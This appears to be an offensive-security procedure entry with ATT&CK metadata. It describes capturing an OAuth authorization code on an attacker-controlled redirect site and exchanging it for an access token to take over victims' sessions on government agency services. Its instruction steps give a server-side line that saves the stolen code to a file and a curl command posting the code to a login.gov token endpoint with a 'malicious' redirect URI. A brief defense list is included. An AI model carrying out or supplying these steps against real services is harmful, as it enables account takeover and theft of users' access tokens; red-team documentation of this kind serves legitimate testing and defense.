---
tags:
  - token-theft
  - session-hijack
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-exchange-code]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Application Access Token]]'
updated_at: '2025-12-14T17:29:19.956Z'
sub_techniques: []
id: 7948971a-2609-43da-ba8b-431cd5ac811f
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Application Access Token]]'
---
# Compromise User Token on Attacker's Site

## Summary

This procedure captures the authorization code or token from the redirect on the attacker-controlled site and exchanges it for access tokens to compromise sessions on integrated agency services.

## Description

Upon redirect, the URI contains the code (e.g., /malicious?code=ABC123). The attacker logs this, then uses the token endpoint to exchange for an access token, enabling API calls as the victim for account takeover.

## Requirements

1. Attacker site receiving the redirect
2. Captured code from URI
3. Client credentials if needed for exchange

## Defense

Defensive measures and detection strategies:

- Use PKCE for code exchange security
- Short token lifetimes and rotation
- Monitor for anomalous token usage

## Objectives

1. Extract code/token from redirect
2. Exchange for access token
3. Access protected resources

## Instructions

### Step 1: Capture the Code on Attacker Site

**Context**: Implement logging on the callback endpoint to grab query params.

**Command** ([[commands/curl-exchange-code]]):
```bash
# Server-side log: echo $_GET['code'] > stolen.txt (in PHP/JS)
```

> Manually or via script, note the code from the incoming request.

### Step 2: Exchange Code for Token

**Context**: POST to token endpoint with captured code.

**Command** ([[commands/curl-exchange-code]]):
```bash
curl -X POST "https://idp.login.gov/oauth/token" -d "grant_type=authorization_code&code=CAPTURED_CODE&redirect_uri=https://agency.gov.example.com/malicious&client_id=CLIENT_ID&client_secret=SECRET" -v
```

> Response includes access_token; use it for agency APIs.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Application Access Token]]

### Sub-Techniques


## Commands Used

- [[commands/curl-exchange-code]]

## Tools Used


## Tags

- [[token-theft]]
- [[account-takeover]]
